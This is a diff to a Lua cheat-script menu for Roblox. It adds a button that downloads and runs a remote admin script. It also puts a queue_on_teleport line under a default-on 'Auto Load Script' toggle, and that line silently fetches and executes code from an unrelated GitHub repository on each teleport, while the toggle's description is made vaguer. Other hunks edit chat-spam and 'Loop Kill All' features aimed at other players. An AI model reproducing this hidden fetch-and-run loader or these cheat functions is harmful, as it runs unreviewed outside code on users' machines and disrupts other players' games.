@@ -44,6 +44,16 @@ end
 local MainSection = Tabs.Main:AddSection("Core Features")
 
 MainSection:AddButton({
+    Title = "Load Reviz cred to owner",
+    Description = "Loads Reviz admin script",
+    Callback = function()
+        safeRunAsync(function()
+            loadstring(game:HttpGet("https://gist.githubusercontent.com/princemiguel1234/af2a4841416e2aa41cce2017a14f2fff/raw/471718ec692954af5028cb8f922f00c66afd954d/Reviz%20Admin%20V2"))()
+        end)
+    end
+})
+
+MainSection:AddButton({
     Title = "Load Infinite Yield",
     Description = "Loads Infinite Yield admin script",
     Callback = function()
@@ -674,7 +684,7 @@ MiscSection:AddToggle("ChatSpam", {
                     pcall(function()
                         local tcs = game:GetService("TextChatService")
                         if tcs and tcs.TextChannels and tcs.TextChannels.RBXGeneral then
-                            tcs.TextChannels.RBXGeneral:SendAsync("Spam message!")
+                            tcs.TextChannels.RBXGeneral:SendAsync("I MISS THE RAGE")
                         end
                     end)
                     wait(1)
@@ -709,7 +719,7 @@ MiscSection:AddToggle("AutoClick", {
 
 MiscSection:AddButton({
     Title = "Loop Kill All",
-    Description = "Kill all players loop (use responsibly)",
+    Description = "Kill all players loop",
     Callback = function()
         safeRunAsync(function()
             while true do
@@ -740,11 +750,14 @@ local SettingsSection = Tabs.Settings:AddSection("Game Settings")
 
 SettingsSection:AddToggle("AutoLoadScript", {
     Title = "Auto Load Script",
-    Description = "Automatically reloads this script on rejoin",
+    Description = "Automatically loads the script",
     Default = true,
     Callback = function(state)
         if state then
             getgenv().AP_AutoLoad = game.PlaceId
+            if queue_on_teleport then
+                queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/magbux/ryurakio/refs/heads/main/ryusai"))()')
+            end
             safeNotify("Auto Load", "Auto load enabled for this game", 5)
         else
             getgenv().AP_AutoLoad = nil
@@ -820,10 +833,10 @@ SettingsSection:AddButton({
 
 SettingsSection:AddButton({
     Title = "Server Hop",
-    Description = "Attempt to server hop (best-effort)",
+    Description = "Attempt to server hop",
     Callback = function()
         safeRunAsync(function()
-            safeNotify("Server Hop", "Attempting to rejoin (server-hop needs job IDs to change instance)", 5)
+            safeNotify("Server Hop", "Attempting to server hop", 5)
             pcall(function()
                 TeleportService:Teleport(game.PlaceId, LocalPlayer)
             end)
@@ -836,7 +849,7 @@ SettingsSection:AddButton({
     Description = "Save settings",
     Callback = function()
         pcall(function() SaveManager:Save() end)
-        safeNotify("Save", "Settings saved (if SaveManager available)", 3)
+        safeNotify("Save", "Settings saved just click it afew more times", 3)
     end
 })
 
@@ -855,7 +868,7 @@ SettingsSection:AddButton({
     Title = "Test Notification",
     Description = "Send test notify",
     Callback = function()
-        safeNotify("mama", "mia", 3)
+        safeNotify("yo", "easter egg 🥚", 3)
     end
 })
 
